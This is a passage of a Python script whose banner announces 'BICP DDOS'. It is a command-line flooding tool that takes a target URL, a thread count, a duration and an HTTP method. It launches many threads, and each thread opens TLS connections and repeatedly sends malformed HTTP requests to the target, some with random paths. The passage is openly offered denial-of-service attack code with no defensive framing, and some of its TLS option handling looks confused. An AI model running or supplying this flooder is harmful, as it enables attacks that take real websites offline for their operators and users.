             ssl_context.options |= ssl.HAS_ALPN
             ssl_context.options |= ssl.HAS_ECDH
             ssl_context.options |= ssl.HAS_NPN
             ssl_context.options |= ssl.HAS_SNI
             ssl_context.options |= ssl.HAS_SSLv2
             ssl_context.options |= ssl.HAS_SSLv3
             ssl_context.options |= ssl.HAS_TLSv1
             ssl_context.options |= ssl.HAS_TLSv1_1
             ssl_context.options |= ssl.HAS_TLSv1_2
             ssl_context.options |= ssl.HAS_TLSv1_3
             url_path = generate_url_path(1)
             url_leak = ''
             if  '/' in target['uri']:
               url_leak = target['uri']
             else:
               url_leak = '/'
             byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             for _ in range(50):
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
             ssl_socket.close()
        except Exception as e:
           print(e)
           pass

import sys
url = ''
time_booter = 0
thread_lower = 0
METHODS = ''
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO BICP DDOS\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(int(thread_lower)):
   threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter)).start()      